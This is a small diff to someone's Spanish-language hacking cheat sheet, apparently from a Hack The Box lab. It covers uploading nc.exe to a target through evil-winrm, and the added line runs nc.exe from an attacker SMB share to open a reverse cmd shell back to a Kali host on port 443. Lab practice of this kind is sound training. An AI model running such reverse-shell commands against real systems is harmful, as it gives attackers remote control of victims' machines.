@@ -18,3 +18,7 @@
 // SUBIR ARCHIVO AL TARGED EVIL-WINRM
     !! asegurate de tener permiso de escritura en la carpeta actual,  cd %UserProfile%
   ::: upload /home/mangoPc/Desktop/HTB/return/nc.exe
+
+
+
+::: cmd /c \\ipKali\smbFolder\nc.exe -e cmd ipKali 443
